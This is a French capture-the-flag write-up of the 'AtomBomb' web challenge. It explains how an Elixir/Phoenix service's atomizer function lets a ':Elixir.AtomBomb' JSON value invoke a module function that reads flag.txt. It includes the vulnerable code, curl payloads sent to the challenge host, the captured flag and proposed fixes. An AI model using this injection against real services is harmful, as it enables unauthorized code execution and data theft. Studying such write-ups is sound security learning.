# AtomBomb

## Description de l’épreuve

Le challenge "AtomBomb" est une épreuve de type web/service où l’on interagit avec un serveur écrit en Elixir. Le point de départ pour l'exploit était un service HTTP qui acceptait un JSON en POST sur une route ``/bomb_impacts``, censé contenir des informations sur une bombe (altitude, type d’explosion, puissance, etc.). Le but était de déclencher une exécution inattendue ou une erreur du serveur afin de récupérer un flag.

Contrairement aux services REST classiques, ce backend repose sur Elixir (et Phoenix), un framework fonctionnel. Le nom de l’épreuve et certains comportements du serveur suggéraient une vulnérabilité liée aux atoms, une structure de données particulière à Elixir.

## Analyse des artefacts et identification des indices

Le serveur s'attendait à recevoir un objet JSON avec une clé ``impact`` contenant les détails d’une bombe. Par exemple :
```json
{
  "impact": {
    "bomb": {
      "location": "florida",
      "altitude": "low_altitude",
      "power": 363,
      "explosion_type": 4
    }
  }
}
```

Une tentative de fuzzing a révélé que certaines erreurs côté serveur faisaient référence à des atoms inconnus, ce qui nous a amené à se concentrer sur le ``:`` dans Elixir, la fonction ``String.to_existing_atom/1`` ne crée pas de nouvel atom mais échoue si l’atom n’existe pas déjà. Cela ouvre la voie à un crash contrôlé ou même à une exécution de code si d'autres modules sont appelés dynamiquement.

Le code source du backend a confirmé cette intuition. Dans le controller :

```elixir
defmodule AtomBomb.PageController do
# (...)
  def get_bomb_impacts(conn, params) do
    params = AtomBomb.atomizer(params)
    danger_message = AtomBomb.calculate_bomb_danger_level(params.impact.bomb)
    render(conn, :danger_level, danger_message: danger_message)
  end
end
```

La ligne vulnérable est :
``params = AtomBomb.atomizer(params)``

Elle appelle la fonction ``atomizer/1`` définie dans le module AtomBomb, dont voici le passage critique :

```elixir
def atomizer(params) when is_binary(params) do
  if String.at(params, 0) == ":" do
    atom_string = String.slice(params, 1..-1//1)
    case string_to_atom(atom_string) do
      {:ok, val} -> val
      :error -> nil
    end
  else
    params
  end
end
```

Cette fonction convertit toute chaîne commençant par ``:`` en un atom Elixir existant. Si ce champ correspond à un nom de module valide (par exemple ``":Elixir.AtomBomb"``), il devient littéralement l’atom ``Elixir.AtomBomb``.
<br>
Ensuite, dans une autre partie du code, si ce champ est utilisé dans un ``apply/3`` (par exemple ``apply(mod, :bomb, [])``), cela permet d'exécuter n’importe quelle fonction ``bomb/0`` d’un module existant. Le module ``AtomBomb`` inclut justement une telle fonction :

```elixir
def bomb() do
  flag = case File.read("flag.txt") do
    {:ok, flag} -> flag
    {:error, _} -> "bctf{REDACTED}"
  end
  "The atom bomb detonated, and left in the crater there is a chunk of metal inscribed with #{flag}"
end
```

Alors, un test avec un payload du type :
```json
{
  "impact": ":Elixir.AtomBomb"
}
```
Et donc on obtiendrait:
`` danger_message = AtomBomb.calculate_bomb_danger_level(Elixir.AtomBomb.bomb)``

ce qui nous donne le flag.

## Recherches effectuées

### Documentation officielle : <br> https://hexdocs.pm/elixir/String.html#to_existing_atom/1

### Résumé utile :

* ``String.to_existing_atom("foo")`` échoue si ``:foo`` n'existe pas.

* Les atoms ne sont pas garbage-collected et peuvent faire planter l'application si on en crée trop (atom leak).

* Certaines fonctions essaient de convertir dynamiquement des chaînes en atoms pour appeler des modules/fonctions, c’est là qu’on peut injecter quelque chose de spécial.

## Tentatives et actions mises en œuvre

1. Envoi de payloads valides (structure correcte, sans injection) → réponses standards.

2. Envoi de chaînes invalides dans les clés ou valeurs → erreurs mais sans flag.

3. Hypothèse sur l’usage de to_existing_atom → tests avec valeurs "piégées".

4. Injection de ":Elixir.AtomBomb" dans le champ impact → déclenchement du flag.

## CWE associées

* **CWE-138: Improper Neutralization of Special Elements** — Usage dangereux de fonctions de conversion type eval, to_atom, etc.

* **CWE-502: Deserialization of Untrusted Data** — Même si ce n'est pas de la désérialisation au sens strict, il s’agit d’un traitement non-sécurisé de données entrantes.

## Flag obtenu

``bctf{n0w_w3_ar3_a1l_d3ad_:(_8cd12c17102ac269}``

Ce flag souligne bien mon état après l'avoir eu lol.

## Code des exploits et payloads

```sh
curl -X POST http://localhost:6888/bomb_impacts \
  -H "Content-Type: application/json" \
  --data '{"impact": ":Elixir.AtomBomb"}'
```
```sh
curl -X POST https://atom-bomb.atreides.b01lersc.tf/bomb_impacts \
  -H "Content-Type: application/json" \
  --data '{"impact": ":Elixir.AtomBomb"}'
```

Ce simple payload suffit à déclencher la réponse contenant le flag si le backend tente de convertir ce champ en atom et l’évalue ensuite.

## Propositions de correction

* Supprimer toute conversion dynamique non contrôlée de chaînes en atoms.

* Remplacer apply/3 par des appels directs à des fonctions explicites et sûres.

* Isoler et filtrer les paramètres utilisateur dès l’entrée (pattern matching strict).

* Si des atoms doivent être générés, valider contre une liste blanche ou utiliser une table de correspondance sécurisée.
